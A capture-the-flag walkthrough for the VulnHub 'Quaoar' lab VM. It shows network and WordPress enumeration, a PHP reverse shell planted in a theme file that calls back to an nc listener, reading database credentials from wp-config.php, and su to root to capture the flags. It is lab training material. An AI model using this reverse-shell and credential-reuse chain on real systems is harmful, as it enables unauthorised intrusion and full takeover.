@@ -1,0 +1,418 @@
+URL: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
+
+1.) Identify the IP of the victim
+root@kali:~# netdiscover
+Currently scanning: 192.168.41.0/16   |   Screen View: Unique Hosts
+
+ 10 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 600
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.1.10    80:3f:5d:16:08:33      3     180  Winstars Technology Ltd
+ 192.168.1.3     f4:0f:24:33:5e:d1      1      60  Apple, Inc.
+ 192.168.1.13    00:0c:29:b0:39:95      1      60  VMware, Inc.
+ 192.168.1.1     a0:63:91:f0:cc:4b      1      60  NETGEAR
+ 192.168.1.4     70:70:0d:c9:ad:78      1      60  Unknown vendor
+ 192.168.1.2     b0:df:3a:de:59:08      1      60  Samsung Electronics Co.,Ltd
+ 192.168.1.6     70:77:81:c0:6c:33      1      60  Hon Hai Precision Ind. Co.,Ltd.
+ 192.168.1.8     bc:9f:ef:69:35:19      1      60  Unknown vendor
+
+2.) Port Scan
+root@kali:~# nmap -T4 -A -p- 192.168.1.13
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-20 00:50 EDT
+Nmap scan report for 192.168.1.13
+Host is up (0.00056s latency).
+Not shown: 65526 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
+|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
+|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
+53/tcp  open  domain      ISC BIND 9.8.1-P1
+| dns-nsid:
+|_  bind.version: 9.8.1-P1
+80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_Hackers
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: RESP-CODES PIPELINING TOP UIDL CAPA SASL STLS
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-20T04:50:48+00:00; +1s from scanner time.
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: SASL-IR have post-login listed capabilities LITERAL+ Pre-login LOGINDISABLEDA0001 ENABLE IDLE STARTTLS more LOGIN-REFERRALS IMAP4rev1 OK ID
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-20T04:50:48+00:00; +2s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
+993/tcp open  ssl/imap    Dovecot imapd
+|_imap-capabilities: SASL-IR have listed post-login capabilities Pre-login LITERAL+ AUTH=PLAINA0001 ENABLE IDLE more LOGIN-REFERRALS IMAP4rev1 OK ID
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-20T04:50:48+00:00; +2s from scanner time.
+995/tcp open  ssl/pop3    Dovecot pop3d
+|_pop3-capabilities: RESP-CODES PIPELINING TOP UIDL CAPA USER SASL(PLAIN)
+| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
+| Not valid before: 2016-10-07T04:32:43
+|_Not valid after:  2026-10-07T04:32:43
+|_ssl-date: 2017-03-20T04:50:48+00:00; +2s from scanner time.
+MAC Address: 00:0C:29:B0:39:95 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.5
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.6.3)
+|   Computer name: Quaoar
+|   NetBIOS computer name:
+|   Domain name:
+|   FQDN: Quaoar
+|_  System time: 2017-03-20T00:50:48-04:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.56 ms 192.168.1.13
+
+Post-scan script results:
+| clock-skew:
+|_  2s: Majority of systems scanned
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 36.05 seconds
+
+3.) Web Server Scan
+root@kali:~# nikto -h http://192.168.1.13
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.13
++ Target Hostname:    192.168.1.13
++ Target Port:        80
++ Start Time:         2017-03-20 00:51:45 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
++ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wordpress/: A Wordpress installation was found.
++ 8348 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2017-03-20 00:51:59 (GMT-4) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+4.) Wordpress Vulnerability Scanner
+root@kali:~# wpscan --url http://192.168.1.13/wordpress --enumerate u
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9.1
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]y
+[i] Updating the Database ...
+[i] Update completed.
+[+] URL: http://192.168.1.13/wordpress/
+[+] Started: Mon Mar 20 00:52:30 2017
+
+[!] The WordPress 'http://192.168.1.13/wordpress/readme.html' file exists exposing a version number
+[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
+[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
+[+] XML-RPC Interface available under: http://192.168.1.13/wordpress/xmlrpc.php
+[!] Upload directory has directory listing enabled: http://192.168.1.13/wordpress/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://192.168.1.13/wordpress/wp-includes/
+
+[+] WordPress version 3.9.14 identified from advanced fingerprinting (Released on 2016-09-07)
+[!] 8 vulnerabilities identified from the version number
+
+[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
+    Reference: https://wpvulndb.com/vulnerabilities/8716
+    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
+[i] Fixed in: 3.9.15
+
+[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
+    Reference: https://wpvulndb.com/vulnerabilities/8718
+    Reference: https://www.mehmetince.net/low-severity-wordpress/
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
+[i] Fixed in: 3.9.15
+
+[!] Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
+    Reference: https://wpvulndb.com/vulnerabilities/8719
+    Reference: https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
+[i] Fixed in: 3.9.15
+
+[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
+    Reference: https://wpvulndb.com/vulnerabilities/8720
+    Reference: https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
+[i] Fixed in: 3.9.15
+
+[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
+    Reference: https://wpvulndb.com/vulnerabilities/8721
+    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
+[i] Fixed in: 3.9.15
+
+[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8730
+    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
+[i] Fixed in: 3.9.16
+
+[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
+    Reference: https://wpvulndb.com/vulnerabilities/8765
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
+    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
+    Reference: http://seclists.org/oss-sec/2017/q1/563
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
+[i] Fixed in: 3.9.17
+
+[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
+    Reference: https://wpvulndb.com/vulnerabilities/8766
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
+[i] Fixed in: 3.9.17
+
+[+] WordPress theme in use: twentyfourteen - v1.1
+
+[+] Name: twentyfourteen - v1.1
+ |  Location: http://192.168.1.13/wordpress/wp-content/themes/twentyfourteen/
+[!] The version is out of date, the latest version is 1.9
+ |  Style URL: http://192.168.1.13/wordpress/wp-content/themes/twentyfourteen/style.css
+ |  Referenced style.css: wp-content/themes/twentyfourteen/style.css
+ |  Theme Name: Twenty Fourteen
+ |  Theme URI: http://wordpress.org/themes/twentyfourteen
+ |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
+ |  Author: the WordPress team
+ |  Author URI: http://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found
+
+[+] Enumerating usernames ...
+[+] Identified the following 2 user/s:
+    +----+--------+--------+
+    | Id | Login  | Name   |
+    +----+--------+--------+
+    | 1  | admin  | admin  |
+    | 2  | wpuser | wpuser |
+    +----+--------+--------+
+[!] Default first WordPress username 'admin' is still used
+
+[+] Finished: Mon Mar 20 00:52:37 2017
+[+] Requests Done: 71
+[+] Memory used: 15.051 MB
+[+] Elapsed time: 00:00:07
+
+5.) Reverse Connect
+
+In Browser
+http://192.168.1.13/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentyfourteen&scrollto=1974&updated=true
+PHP Reverse Shell -> http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+$ip = '192.168.1.13';  // CHANGE THIS
+$port = 1234;          // CHANGE THIS
+http://192.168.1.13/wordpress/?p=404.php
+
+In Kali
+root@kali:~# nc -lvp 1234
+listening on [any] 1234 ...
+192.168.1.13: inverse host lookup failed: Unknown host
+connect to [192.168.1.11] from (UNKNOWN) [192.168.1.13] 40613
+Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux
+ 01:25:51 up 40 min,  0 users,  load average: 0.08, 0.07, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@Quaoar:/$ cd /home
+cd /home
+www-data@Quaoar:/home$ ls
+ls
+wpadmin
+www-data@Quaoar:/home$ cd wpadmin
+cd wpadmin
+www-data@Quaoar:/home/wpadmin$ ls
+ls
+flag.txt
+www-data@Quaoar:/home/wpadmin$ cat flag.txt
+cat flag.txt
+2bafe61f03117ac66a73c3c514de796e   =======================> Flag 1
+www-data@Quaoar:/home/wpadmin$ cd /var/www/wordpress
+cd /var/www/wordpress
+www-data@Quaoar:/var/www/wordpress$ ls
+ls
+index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
+license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
+readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
+wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
+wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
+www-data@Quaoar:/var/www/wordpress$ cat wp-config.php
+cat wp-config.php
+<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, WordPress Language, and ABSPATH. You can find more information
+ * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
+ * wp-config.php} Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'rootpassword!');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+/** */
+define('WP_HOME','/wordpress/');
+define('WP_SITEURL','/wordpress/');
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         '`47hAs4ic+mLDn[-PH(7t+Q+J)L=8^ 8&z!F ?Tu4H#JlV7Ht4}Fsdbg2us1wZZc');
+define('SECURE_AUTH_KEY',  'g#vFXk!k|3,w30.VByn8+D-}-P(]c1oI|&BfmQqq{)5w)B>$?5t}5u&s)#K1@{%d');
+define('LOGGED_IN_KEY',    '[|;!?pt}0$ei+>sS9x+B&$iV~N+3Cox-C5zT|,P-<0YsX6-RjNA[WTz-?@<F[O@T');
+define('NONCE_KEY',        '7RFLj2-NFkAjb6UsKvnN+1aj<Vm++P9<D~H+)l;|5?P1*?gi%o1&zKaXa<]Ft#++');
+define('AUTH_SALT',        'PN9aE9`#7.uL|W8}pGsW$,:h=Af(3h52O!w#IWa|u4zfouV @J@Y_GoC8)ApSKeN');
+define('SECURE_AUTH_SALT', 'wGh|W wNR-(p6fRjV?wb$=f4*KkMM<j0)H#Qz-tu.r~2O*Xs9W3^_`c6Md+ptRR.');
+define('LOGGED_IN_SALT',   '+36M1E5.MC;-k:[[_bs>~a0o_c$v?ok4LR|17 ]!K:Z8-]lcSs?EXC`TO;X3in[#');
+define('NONCE_SALT',       'K=Sf5{EDu3rG&x=#em=R}:-m+IRNs<@4e8P*)GF#+x+,zu.D8Ksy?j+_]/Kcn|cn');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * WordPress Localized Language, defaults to English.
+ *
+ * Change this to localize WordPress. A corresponding MO file for the chosen
+ * language must be installed to wp-content/languages. For example, install
+ * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
+ * language support.
+ */
+define('WPLANG', '');
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+
+www-data@Quaoar:/var/www/wordpress$ su
+su
+Password: rootpassword!
+
+root@Quaoar:/var/www/wordpress# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Quaoar:/var/www/wordpress# cd /root
+cd /root
+root@Quaoar:~# ls
+ls
+flag.txt  vmware-tools-distrib
+root@Quaoar:~# cat flag.txt
+cat flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb   =======================> Flag 2
+root@Quaoar:~# cat /etc/cron.d/php5
+cat /etc/cron.d/php5
+# /etc/cron.d/php5: crontab fragment for php5
+#  This purges session files older than X, where X is defined in seconds
+#  as the largest value of session.gc_maxlifetime from all your php.ini
+#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
+# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de   =======================> Flag 3
+# Look for and purge old sessions every 30 minutes
+09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
+root@Quaoar:~#
